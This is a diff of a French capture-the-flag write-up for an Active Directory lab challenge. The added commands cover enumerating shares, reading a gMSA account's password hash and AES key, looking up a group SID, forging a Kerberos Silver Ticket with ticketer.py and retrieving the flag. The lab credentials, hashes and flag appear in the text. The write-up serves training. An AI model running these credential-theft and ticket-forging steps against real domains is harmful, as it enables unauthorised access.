@@ -171,20 +171,57 @@ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd180
 **Cible :** `10.0.10.190`  
 **Credentials :** `accord6490_404Player` / `L5883dpefus&@#`
 
-Le compte initial a `ReadGMSAPassword` sur `svc_broker$` :
+### Enumération initiale
 
 ```bash
-# Hash NTLM : 593749912b41ece1498731f50f9d58bd
-# Clé AES256 : 55b4857af9e48fa5b4be74a2ee1bd64ca985720787717c4bc3b205e13bb3d291
+nxc smb 10.0.10.190 -u 'accord6490_404Player' -p 'L5883dpefus&@#' --shares
+# DevTools : READ
 ```
 
-`svc_broker$` a la délégation contrainte vers `HTTP/gateway.pasteur.lab`. `legacy_admin` est désactivé donc S4U2Proxy impossible, nous devons faire un **Silver Ticket**.
+Le partage `DevTools` contient un `README.txt` décrivant le service `PasteurBroker`, une API HTTP authentifiée Kerberos sur `gateway.pasteur.lab:19432`. 
+
+Le service exige :
+- Un ticket pour le SPN `HTTP/gateway.pasteur.lab`
+- L'identité `legacy_admin`
+- L'appartenance au groupe `lab_keepers` (RID 1104) dans le PAC
+
+### BloodHound - ReadGMSAPassword
 
 ```bash
+bloodhound-python -u 'accord6490_404Player' -p 'L5883dpefus&@#' -d CTFCORP.LOCAL -c all -ns 10.0.10.190
+```
+
+Notre compte a `ReadGMSAPassword` sur `svc_broker$`, qui possède une délégation contrainte vers `HTTP/gateway.pasteur.lab`.
+
+### Dump du compte GMSA
+
+```bash
+gMSADumper.py -u 'accord6490_404Player' -p 'L5883dpefus&@#' -d CTFCORP.LOCAL
+# svc_broker$ :: 593749912b41ece1498731f50f9d58bd
+# svc_broker$ :: aes256 : 55b4857af9e48fa5b4be74a2ee1bd64ca985720787717c4bc3b205e13bb3d291
+```
+
+Vérification :
+
+```bash
+nxc smb 10.0.10.190 -u 'svc_broker$' -H '593749912b41ece1498731f50f9d58bd'
+```
+
+### Récupération du SID
+
+```bash
+bloodyAD -u 'svc_broker$' -p ':593749912b41ece1498731f50f9d58bd' -d CTFCORP.LOCAL --host 10.0.10.190 get object "lab_keepers" --attr objectSid
+# S-1-5-21-2991091012-709284574-3735152529-1104
+```
+
+### Forge du Silver Ticket
+
+```bash
+# RID legacy_admin = 1105, lab_keepers = 1104
 ticketer.py -aesKey 55b4857af9e48fa5b4be74a2ee1bd64ca985720787717c4bc3b205e13bb3d291 -domain-sid S-1-5-21-2991091012-709284574-3735152529 -domain CTFCORP.LOCAL -spn HTTP/gateway.pasteur.lab -user-id 1105 -groups 1104,513,512 legacy_admin
 ```
 
-Configuration Kerberos pour le realm cross-domain :
+### Configuration Kerberos
 
 ```ini
 # /etc/krb5.conf
@@ -193,10 +230,20 @@ Configuration Kerberos pour le realm cross-domain :
     dns_canonicalize_hostname = false
     rdns = false
 
+[realms]
+    CTFCORP.LOCAL = {
+        kdc = 10.0.10.190
+        admin_server = 10.0.10.190
+    }
+
 [domain_realm]
+    .ctfcorp.local = CTFCORP.LOCAL
+    ctfcorp.local = CTFCORP.LOCAL
     .pasteur.lab = CTFCORP.LOCAL
     pasteur.lab = CTFCORP.LOCAL
 ```
+
+### Récupération du flag
 
 ```bash
 export KRB5CCNAME=/workspace/legacy_admin.ccache
@@ -206,7 +253,6 @@ curl -s --negotiate -u : http://gateway.pasteur.lab:19432/flag
 ```
 404CTF{S1lv3r_P4st3ur_Gh0st_1d3nt1ty_L3g3ndr3}
 ```
----
 
 ## Le Rayonnement de Becquerel
 
